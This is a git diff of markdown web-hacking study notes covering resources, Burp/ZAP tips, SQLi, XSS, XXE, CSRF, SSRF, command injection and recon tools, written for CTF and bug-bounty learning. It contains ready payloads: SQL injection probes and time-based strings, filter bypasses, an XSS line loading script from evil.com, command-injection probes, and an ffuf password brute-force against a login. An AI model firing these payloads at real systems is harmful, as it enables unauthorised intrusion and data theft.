@@ -1,13 +1,13 @@
-##  ► web
-### Resources
-#### Courses
+#  ► web
+## Resources
+### Courses
 
 - [Web Security Academy](https://portswigger.net/web-security)
 - [Pentesterlab](https://pentesterlab.com/)
 - [OWASP-wstg](https://owasp.org/www-project-web-security-testing-guide/)
 - [Hacker101](https://www.hackerone.com/hacker101)
 
-#### CTF
+### CTF
 
 - [247/CTF](https://247ctf.com/)
 - [websec.fr](http://websec.fr/)
@@ -18,21 +18,21 @@
 - [Natas - OverTheWire](https://overthewire.org/wargames/natas/)
 - [pwnfunction XSS Game](https://xss.pwnfunction.com/)
 
-#### Vulnerable Apps
+### Vulnerable Apps
 
 - [Juice Shop](https://owasp.org/www-project-juice-shop/)
 - [bWAPP](http://www.itsecgames.com/)
 - [Vulhub](https://github.com/vulhub/vulhub)
 - [DVWA](http://www.dvwa.co.uk/)
 
-#### Bug Bounty
+### Bug Bounty
 
 - [Web Hacking 101](https://leanpub.com/web-hacking-101)
 - [Real World Bug Hunting](https://www.amazon.in/Real-World-Bug-Hunting-Field-Hacking-ebook/dp/B072SQZ2LG)
 - [Resources for Beginner Bug Bounty Hunters](https://github.com/nahamsec/Resources-for-Beginner-Bug-Bounty-Hunters/)
 - [Intigriti Article](https://kb.intigriti.com/en/articles/3471127-useful-resources-about-web-hacking-bug-bounty)
 
-### Tips
+## Tips
 
 - Test every input, make sure to disregard any client-side restrictions.
 - Remember the source and DOM are different. Keep an eye out for the devtools.
@@ -47,43 +47,7 @@
 - Keep noting interesting things. While jumping from one feature to the next you might forget something.
 - To go directly into console in devtools `Ctrl-shift-J` similarly you can find shortcuts for other tabs.
 
-### While hunting bugs
-
-- Setup context in proxy
-- View website source code
-- Use browser devtools
-- Keep these notes open
-- Notes for the target
-
-### OWASP ZAP
-
-> https://www.youtube.com/watch?v=7WL-emt5PDc
-
-#### Equivalents of Burp in ZAP
-
-| Burp         | Zap                    |
-|--------------|------------------------|
-| Site map     | Site tree              |
-| HTTP history | History                |
-| Scope        | Context                |
-| Interceptor  | Break                  |
-| Repeater     | Request editor         |
-| Intruder     | Fuzzer                 |
-| Spider       | Spider                 |
-| Scanner      | Active scan            |
-| BApp store   | Addon marketplace      |
-| Sequencer    | Token gen & analysis   |
-| Decoder      | Encode / decode / hash |
-| Macros       | Zest record            |
-| Comparer     | Compare requests       |
-
-To-do:
-
-1. Learn the ZAP rest API.
-2. Learn scripting in ZAP.
-3. https://github.com/we45/ZAP-Mini-Workshop
-
-### Burp Suite
+## Burp Suite
 
 - Set scope and remove tracking-like requests to reduce clutter.
 - Burp hotkeys
@@ -96,9 +60,119 @@ To-do:
     - BurpBounty
     - Paraminer
 
-### Bugs
+## Bugs
+### SQLi
 
-#### SSRF
+- [Portswigger - SQL injection cheatsheet](https://portswigger.net/web-security/sql-injection/cheat-sheet) (doesn't include sqlite)
+- Do a simple sanity check for `'` or `"` in payload. Try bypassing client side restrictions for input in fields such as date.
+- Oracle comments don't work with semicolon. `OR 1=1--` might work when `OR 1=1;--` doesn't.
+- MySQL comments `--` require a space after them to work `-- `.
+- Remember to encode spaces to `+` and other url unsafe characters as well.
+- When using `UNION` to extract `table_name`, make sure that it is positioned with a column that has the same datatype.
+- In where clause, try to use quotes to cover table and column names.
+- While `union` can be used with `select`, look for **stacked queries** to execute any SQL statement. Remember to commit.
+- If any words are filtered, see if they are done recursively. If not, `selselectect` should work.
+- If spaces are blacklisted, you can use alternates such as: `[tabs] %0a %00 %09 %0d /**/`
+- If you are in the context of MySQL, you can use variables without explicitly defining them. For example if "admin" is being filtered, you can put "nimda" as one of the columns (say, id) and use `reverse(id)` in another column (webhacking.kr - 59).
+- To just see tables created by the user in MySQL: `union select table_name,null,null from information_schema.tables where table_schema not in ('information_schema','mysql','performance_schema')`
+- Syntax of LIMIT: `LIMIT offset,quantity` where offset starts from 0.
+- [Portswigger - Blind SQL injection](https://portswigger.net/web-security/sql-injection/blind)
+- For time-based, first figure out the max time a request can take.
+- For faster blind-sqli execution, in the first pass check what characters `*i*` does the target string contain from `string.printable` and append it to a filtered list. Then in the second pass, from that filtered list of characters check the real order of the target string `i*`.
+- Remember to start `substring(str,pos,len)` from `1` not `0`.
+- Use `LIKE BINARY` for case-sensitive blind sqli matching.
+- For postgres time-based, `||pg_sleep(10)`
+- For postgres time-based conditions `'; SELECT CASE WHEN (condition) THEN pg_sleep(10) ELSE pg_sleep(0) END--`
+- To test for SQL injection: [source](https://twitter.com/pwntheweb/status/1253224265853198336)
+
+```
+/?q=1
+/?q=1'
+/?q=1"
+/?q=[1]
+/?q[]=1
+/?q=1`
+/?q=1\
+/?q=1/*'*/
+/?q=1/*!1111'*/
+/?q=1'||'asd'||'
+/?q=1' or '1'='1
+/?q=1 or 1=1
+/?q='or''='
+```
+
+sqlmap:
+
+- If SQLmap stops in between, try pressing `Enter` or `Ctrl-c`
+- Always use `--threads 10` to speed up.
+- Output goes to `~/.sqlmap/output/`
+
+### PHP
+
+- Sometimes `<?` does not work but `<?php` does.
+- Type confusion: If an array is passed to `strcmp()`, it will give a warning but the compare result returns 0.
+- Object injection: If `unserialize()` is being used, you might be able to craft an object and use trampoline functions.
+- Type juggling: `0e123` evaluates to `0`.
+- For checking if any functions are blacklisted:
+```php
+var_dump(ini_get('safe_mode'));
+var_dump(explode(',',ini_get('disable_functions')));
+var_dump(explode(',',ini_get('suhosin.executor.func.blacklist')));
+```
+- We can set a directory as base using `open_basedir`
+
+### XSS
+
+- [Portswigger - XSS cheatsheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
+- [Portswigger - XSS contexts](https://portswigger.net/web-security/cross-site-scripting/contexts)
+- When browsers parse tag attributes, they HTML-decode their values first. `<foo bar='z'>` is the same as `<foo bar='&#x7a;'>`
+- AngularJS `ng-app` attribute is processed by AngularJS. Anything within `{{}}` will be executed.
+- jQuery `attr()` used to change attributes, can act as a sink.
+- Strings can be concatenated using minus `-` sign. In a js `eval` context you can use: `"-alert(1)-"`
+- Chrome, Firefox, Safari encode `location.search` and `location.hash`. IE11 and Edge (pre-Chromium) don't encode sources.
+- To pop XSS in `innerHTML` first load the script into `iframe srcdoc` then load that `iframe` into the `innerHTML`.
+- If there are any encoded entities `&lt;` and `&gt;` see if there are any `unescape` calls you can pass them through.
+- `<base href=//evil.com>` allows you to change all relative URLs. For example `<script src=/xss.js>` will use `evil.com` to retrieve `xss.js`.
+- XSS can also be done through file-uploads in case HTML or SVG files are allowed to be uploaded.
+- Blind XSS:
+    - Read https://brutelogic.com.br/blog/blind-xss-code/ and get the code here: http://brutelogic.com.br/brutal/blind/index.txt
+    - Use http://xss.rocks/xss.js for including an `alert()` js file.
+    - Use http://xsshunter.com to test for blind xss.
+- CSP Bypass:
+    - In your devtools, look at the network tab and within the headers for the response, you'll see the CSP header.
+    - You can also copy the url and put it into Google's CSP Evaluator at: https://csp-evaluator.withgoogle.com
+    - If `default-src` is `self`, it can be problematic if the user can upload files.
+- [XSS in postMessage](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#xss-in-postmessage)
+
+### XXE
+
+- [PayloadAllTheThings - XXE](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection)
+- Types covered in websec academy:
+    - Classic file retrieval
+    - SSRF through XXE
+    - Error based
+
+### CSRF
+
+- Try removing the anti-CSRF token altogether.
+- Try submitting anti-CSRF token generated for one user in another user's session.
+- Submitting forms through JavaScript: `document.getElementById("myForm").submit();` or `document.forms[0].submit();`
+
+### Command Injection
+
+- Try `|ls`.
+- For time delays use `sleep 10` or `& ping -c 10 127.0.0.1 &`
+- Redirect output to a file you can read using your browser.
+
+### Recon
+
+- Recon is a continuous process, keep scanning and diffing for subdomains (using git).
+- Don't forget to look into the sources, interesting things might not always be inline.
+- If you have multiple files containing subdomains, merge them using `$ cat file1.txt file2.txt | sort | uniq > out`
+- If you have a subdomain, look for further subdomains for it.
+- When one directory isn't accessible, try its subdirectories.
+
+### SSRF
 
 > talk: https://www.youtube.com/watch?v=o-tL9ULF0KI<br>
 > slides: https://docs.google.com/presentation/d/1JdIjHHPsFSgLbaJcHmMkE904jmwPM4xdhEuwhy2ebvo/htmlpresent
@@ -116,7 +190,8 @@ Not limited to http, you can use other protocols
 - gopher://
 - ssh://
 
-Hurdles
+Hurdles:
+
 - Problem: metadata or internal IPs are getting filtered
 - Solution: Use a custom domain like meta.mydomain.com and point it to the asset you are trying to access (aws.mydomain.com -> 169.254.169.254)
 - Problem: Only able to use whitelisted domains
@@ -124,7 +199,7 @@ Hurdles
 - Problem: SSRF is there but I can't see the output
 - Solution: Use Javascript and exfil data
 
-#### Financially-Oriented
+### Financially-Oriented
 
 > https://twitter.com/irsdl/status/1115951243300691968
 
@@ -134,11 +209,13 @@ Hurdles
         - Changing order upon payment completion
 
 
-#### Understanding postMessage
+### Understanding postMessage
 
-Install apache and put these files in `/var/www/html` then open `http://localhost/send.html`
+Install apache and put these files in `/var/www/html` then open
+`http://localhost/send.html`:
 
 send.html
+
 ```html
 <script>
         function send_message() {
@@ -159,7 +236,7 @@ receive.html
 </script>
 ```
 
-To do in using `window.open` instead of `iframe`
+To do in using `window.open` instead of `iframe`:
 
 ```js
 window.addEventListener("message", function(message) {
@@ -177,7 +254,7 @@ Sources:
 - https://labs.detectify.com/2016/12/08/the-pitfalls-of-postmessage/
 - https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage
 
-#### API hacking
+### API hacking
 
 > https://www.youtube.com/watch?v=Gc7EUjRsrSo
 
@@ -221,7 +298,7 @@ Sources:
     - Object sharing among users
 
 > https://www.youtube.com/watch?v=ijalD2NkRFg
-- Common API security issues
+- Common API security issues:
     - Access controls
     - Input validation
     - Rate limiting
@@ -229,7 +306,7 @@ Sources:
     - 3rd party API abuse
     - App logic errors
 
-- Access controls
+- Access controls:
     - Enumerating restricted endpoints
     - Modifying session tokens
     - Reusing older session tokens
@@ -237,7 +314,7 @@ Sources:
     - Using additional parameters
     - Modifying referer headers
 
-- Input validation
+- Input validation:
     - *anything* that the server takes in
     - Within the request header
     - GET and POST requests parameters
@@ -255,239 +332,49 @@ Sources:
         - File upload
         - SSRF
 
-- Rate limiting
+- Rate limiting:
     - Unauthenticated requests
     - Authenticated requests
     - As a bot or as a developer
     - With a deactivated account
     - With false credentials
 
-- Restricting HTTP methods
+- Restricting HTTP methods:
     - What methods does the application expect
     - Can the methods be used on other endpoints
 
-- 3rd party API abuse
+- 3rd party API abuse:
     - When APIs call other APIs
     - Request splitting: make request to 3rd party using target
     - SSRF: APIs which can resolve URLs can be tricked
     - Unhandled 3rd party input: unexpected errors
 
-#### Oauth
+### Oauth
 
 `TBD`
 
-#### AWS
+### AWS
 
 - When hosting a site as an S3 bucket, the bucket name must match the domain name
 
-#### CRLF Injection / HTTP Response Splitting
+### CRLF Injection / HTTP Response Splitting
 
 - Send a requests such that the response reflects into the headers 
 - Inject a CRLF to make the browser think that the response contains your header
 
-#### Subdomain takeovers
+### Subdomain takeovers
 
 ```
-$ subfinder -d http://hackerone.com -silent | dnsprobe -silent -f domain | httprobe -prefer-https | nuclei -t ~/tools/web/nuclei-templates/subdomain-takeover/detect-all-takeovers.yaml
+$ subfinder -d http://hackerone.com -silent | dnsprobe -silent -f domain |
+httprobe -prefer-https | nuclei -t
+~/tools/web/nuclei-templates/subdomain-takeover/detect-all-takeovers.yaml
 ```
 
-#### GitHub dorks
+### GitHub dorks
 
 - `"example.com" ssh language:yaml` [source](https://twitter.com/ADITYASHENDE17/status/1262747235785138178)
 - `http://chat.googleapis.com/v1/rooms` [source](https://twitter.com/uraniumhacker/status/1262193407616679936)
 
-#### GraphQL
+### GraphQL
 
 - `https://graphql.org/learn/`
-
-#### SQLi
-
-
-- [Portswigger - SQL injection cheatsheet](https://portswigger.net/web-security/sql-injection/cheat-sheet) (doesn't include sqlite)
-- Do a simple sanity check for `'` or `"` in payload. Try bypassing client side restrictions for input in fields such as date.
-- Oracle comments don't work with semicolon. `OR 1=1--` might work when `OR 1=1;--` doesn't.
-- MySQL comments `--` require a space after them to work `-- `.
-- Remember to encode spaces to `+` and other url unsafe characters as well.
-- When using `UNION` to extract `table_name`, make sure that it is positioned with a column that has the same datatype.
-- In where clause, try to use quotes to cover table and column names.
-- While `union` can be used with `select`, look for **stacked queries** to execute any SQL statement. Remember to commit.
-- If any words are filtered, see if they are done recursively. If not, `selselectect` should work.
-- If spaces are blacklisted, you can use alternates such as: `[tabs] %0a %00 %09 %0d /**/`
-- If you are in the context of MySQL, you can use variables without explicitly defining them. For example if "admin" is being filtered, you can put "nimda" as one of the columns (say, id) and use `reverse(id)` in another column (webhacking.kr - 59).
-- To just see tables created by the user in MySQL: `union select table_name,null,null from information_schema.tables where table_schema not in ('information_schema','mysql','performance_schema')`
-- Syntax of LIMIT: `LIMIT offset,quantity` where offset starts from 0.
-- [Portswigger - Blind SQL injection](https://portswigger.net/web-security/sql-injection/blind)
-- For time-based, first figure out the max time a request can take.
-- For faster blind-sqli execution, in the first pass check what characters `*i*` does the target string contain from `string.printable` and append it to a filtered list. Then in the second pass, from that filtered list of characters check the real order of the target string `i*`.
-- Remember to start `substring(str,pos,len)` from `1` not `0`.
-- Use `LIKE BINARY` for case-sensitive blind sqli matching.
-- For postgres time-based, `||pg_sleep(10)`
-- For postgres time-based conditions `'; SELECT CASE WHEN (condition) THEN pg_sleep(10) ELSE pg_sleep(0) END--`
-- To test for SQL injection: [source](https://twitter.com/pwntheweb/status/1253224265853198336)
-
-```
-/?q=1
-/?q=1'
-/?q=1"
-/?q=[1]
-/?q[]=1
-/?q=1`
-/?q=1\
-/?q=1/*'*/
-/?q=1/*!1111'*/
-/?q=1'||'asd'||'
-/?q=1' or '1'='1
-/?q=1 or 1=1
-/?q='or''='
-```
-
-sqlmap
-- If SQLmap stops in between, try pressing `Enter` or `Ctrl-c`
-- Always use `--threads 10` to speed up.
-- Output goes to `~/.sqlmap/output/`
-
-#### PHP
-
-- Sometimes `<?` does not work but `<?php` does.
-- Type confusion: If an array is passed to `strcmp()`, it will give a warning but the compare result returns 0.
-- Object injection: If `unserialize()` is being used, you might be able to craft an object and use trampoline functions.
-- Type juggling: `0e123` evaluates to `0`.
-- For checking if any functions are blacklisted:
-```php
-var_dump(ini_get('safe_mode'));
-var_dump(explode(',',ini_get('disable_functions')));
-var_dump(explode(',',ini_get('suhosin.executor.func.blacklist')));
-```
-- We can set a directory as base using `open_basedir`
-
-#### XSS
-
-- [Portswigger - XSS cheatsheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
-- [Portswigger - XSS contexts](https://portswigger.net/web-security/cross-site-scripting/contexts)
-- When browsers parse tag attributes, they HTML-decode their values first. `<foo bar='z'>` is the same as `<foo bar='&#x7a;'>`
-- AngularJS `ng-app` attribute is processed by AngularJS. Anything within `{{}}` will be executed.
-- jQuery `attr()` used to change attributes, can act as a sink.
-- Strings can be concatenated using minus `-` sign. In a js `eval` context you can use: `"-alert(1)-"`
-- Chrome, Firefox, Safari encode `location.search` and `location.hash`. IE11 and Edge (pre-Chromium) don't encode sources.
-- To pop XSS in `innerHTML` first load the script into `iframe srcdoc` then load that `iframe` into the `innerHTML`.
-- If there are any encoded entities `&lt;` and `&gt;` see if there are any `unescape` calls you can pass them through.
-- `<base href=//evil.com>` allows you to change all relative URLs. For example `<script src=/xss.js>` will use `evil.com` to retrieve `xss.js`.
-- XSS can also be done through file-uploads in case HTML or SVG files are allowed to be uploaded.
-- Blind XSS:
-    - Read https://brutelogic.com.br/blog/blind-xss-code/ and get the code here: http://brutelogic.com.br/brutal/blind/index.txt
-    - Use http://xss.rocks/xss.js for including an `alert()` js file.
-    - Use http://xsshunter.com to test for blind xss.
-- CSP Bypass:
-    - In your devtools, look at the network tab and within the headers for the response, you'll see the CSP header.
-    - You can also copy the url and put it into Google's CSP Evaluator at: https://csp-evaluator.withgoogle.com
-    - If `default-src` is `self`, it can be problematic if the user can upload files.
-- [XSS in postMessage](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#xss-in-postmessage)
-
-#### XXE
-
-- [PayloadAllTheThings - XXE](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection)
-- Types covered in websec academy:
-    - Classic file retrieval
-    - SSRF through XXE
-    - Error based
-
-#### CSRF
-
-- Try removing the anti-CSRF token altogether.
-- Try submitting anti-CSRF token generated for one user in another user's session.
-- Submitting forms through JavaScript: `document.getElementById("myForm").submit();` or `document.forms[0].submit();`
-
-#### Command Injection
-
-- Try `|ls`.
-- For time delays use `sleep 10` or `& ping -c 10 127.0.0.1 &`
-- Redirect output to a file you can read using your browser.
-
-### Recon
-
-- Recon is a continuous process, keep scanning and diffing for subdomains (using git).
-- Don't forget to look into the sources, interesting things might not always be inline.
-- If you have multiple files containing subdomains, merge them using `$ cat file1.txt file2.txt | sort | uniq > out`
-- If you have a subdomain, look for further subdomains for it.
-- When one directory isn't accessible, try its subdirectories.
-
-#### Wordlists
-
-- FuzzDB
-- SecLists
-- PayloadAllTheThings
-
-#### projectdiscovery.io
-
-- subfinder
-- nuclei
-- dnsprobe
-
-#### tomnomnom
-
-- gf
-- meg
-- httprobe
-- waybackurls
-- assetfinder
-
-#### Amass
-
-Look into `https://github.com/OWASP/Amass/blob/master/doc/tutorial.md`
-
-```
-$ amass intel -whois -d DOMAIN
-$ amass enum -dir OUTPUT -passive -src -d DOMAIN
-
-# see sources used
-$ amass enum -list
-```
-
-#### ffuf
-
-```
-$ ffuf -w ~/wordlists/common.txt -u https://example.com/FUZZ
-$ ffuf -w ~/wordlists/10-million-password-list-top-100.txt -X POST -d "username=admin&password=FUZZ" -H "Content-Type: application/x-www-form-urlencoded" -u https://www.example.com/login -mc all -fc 200
-$ ffuf -w ~/wordlists/common.txt -b "cookie1=value1;cookie2=value2" -H "X-Header: ASDF" -u https://example.com/dir/FUZZ
-# use switch -e for comma separated list of extensions to extend FUZZ keyword
-```
-
-#### dnsrecon
-
-```
-$ dnsrecon -n 8.8.8.8 -d example.com
-$ dnsrecon -d example.com -D ~/wordlists/namelist.txt -t brt
-```
-
-#### gau
-
-```
-$ echo example.com | gau
-$ cat domains.txt | gau
-```
-
-#### httpx
-
-```
-$ httpx -l domains
-```
-
-#### gowitness
-
-```
-$ gowitness single --url=https://www.google.com/
-$ gowitness file -s ~/domains.txt
-```
-
-#### paramspider
-
-```
-$ python3 paramspider.py --domain hackerone.com
-```
-
-#### Arjun
-
-```
-$ python3 arjun.py -u http://example.domain.com/endpoint --get
-```
-
